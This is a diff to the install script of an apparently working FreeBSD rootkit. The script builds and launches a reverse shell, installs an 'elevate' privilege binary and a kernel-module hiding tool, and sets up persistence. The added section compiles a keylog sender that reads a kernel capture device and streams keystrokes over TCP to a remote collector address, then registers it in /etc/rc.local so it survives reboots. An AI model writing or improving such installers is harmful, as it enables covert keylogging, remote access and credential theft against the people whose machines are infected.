@@ -42,14 +42,18 @@ make -C "$MODULE_DIR"
 # Build elevate
 cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC"
 
-# Build revshell inside $MODULE_DIR
-# printf '%s\n' '[*] Building revshell...'
-cc -Wall -Wextra -I. -I"$MODULE_DIR" -o "$MODULE_DIR/revshell" "$MODULE_DIR/revshell.c" || fail "Failed to build revshell"
-chmod 755 "$MODULE_DIR/revshell"
+# Build revshell inside $MODULE_DIR.  The reverse-shell half of the project is
+# optional: if the sources are not shipped, skip them instead of aborting the
+# whole install (which would also stop the log sender from being installed).
+if [ -f "$MODULE_DIR/revshell.c" ]; then
+    cc -Wall -Wextra -I. -I"$MODULE_DIR" -o "$MODULE_DIR/revshell" "$MODULE_DIR/revshell.c" || fail "Failed to build revshell"
+    chmod 755 "$MODULE_DIR/revshell"
+fi
 
-# printf '%s\n' '[*] Building remote client binary...'
-cc -O2 -Wall -o "$REMOTE_BIN" "$REMOTE_SRC"
-chmod 755 "$REMOTE_BIN"
+if [ -f "$REMOTE_SRC" ]; then
+    cc -O2 -Wall -o "$REMOTE_BIN" "$REMOTE_SRC"
+    chmod 755 "$REMOTE_BIN"
+fi
 
 # Ensures persistence 
 MODULE_LOADED=false
@@ -82,11 +86,52 @@ fi
 # printf '%s\n' '[*] Installing binaries to /usr/local/bin...'
 install -d -m 755 /usr/local/bin 
 install -m 755 "$ELEVATE_BIN" /usr/local/bin/elevate 
-install -m 755 "$MODULE_DIR/revshell" /usr/local/bin/revshell 
+if [ -f "$MODULE_DIR/revshell" ]; then
+    install -m 755 "$MODULE_DIR/revshell" /usr/local/bin/revshell 
+fi
 
 # Launch revshell background worker using the installed binary path
-pkill -f revshell 2>/dev/null || true
-nohup /usr/local/bin/revshell >/dev/null 2>&1 &
+if [ -x /usr/local/bin/revshell ]; then
+    pkill -f revshell 2>/dev/null || true
+    nohup /usr/local/bin/revshell >/dev/null 2>&1 &
+fi
+
+# Log sender: reads the kernel capture ring (/dev/rootkit) and forwards it over
+# TCP to the collector that runs on $REMOTE_IP (./log there, same port).
+RKLOG=/usr/local/bin/rklog
+SENDER_SRC="$PROJECT_DIR/logsrc/sender.c"
+LOG_PORT="${LOG_PORT:-9999}"
+
+if [ -n "$REMOTE_IP" ] && [ -f "$SENDER_SRC" ]; then
+    # Build next to the target and rename into place: writing straight over a
+    # running rklog fails with ETXTBSY on FreeBSD.
+    if cc -O2 -Wall -Wextra -o "$RKLOG.new" "$SENDER_SRC"; then
+        chmod 755 "$RKLOG.new"
+        mv -f "$RKLOG.new" "$RKLOG"
+
+        if [ ! -f /etc/rc.local ]; then
+            printf '#!/bin/sh\n' > /etc/rc.local
+        fi
+        chmod +x /etc/rc.local
+
+        # Drop a previous entry first, so re-installing against a different
+        # collector does not leave two daemons with two addresses behind.
+        if grep -q rklog /etc/rc.local; then
+            grep -v rklog /etc/rc.local > /etc/rc.local.new || true
+            mv /etc/rc.local.new /etc/rc.local
+            chmod +x /etc/rc.local
+        fi
+        printf '%s %s %s -d\n' "$RKLOG" "$REMOTE_IP" "$LOG_PORT" >> /etc/rc.local
+
+        pkill -f rklog 2>/dev/null || true
+        "$RKLOG" "$REMOTE_IP" "$LOG_PORT" -d
+    else
+        rm -f "$RKLOG.new"
+        printf 'Warning: log sender failed to build; keylogging is disabled\n' >&2
+    fi
+elif [ -z "$REMOTE_IP" ]; then
+    printf 'Warning: no collector address given; keylogging is disabled\n' >&2
+fi
 
 # Install hiding
 cc -Wall -Wextra -o "$PROJECT_DIR/user/hide_kld" "$PROJECT_DIR/user/hide_kld.c"
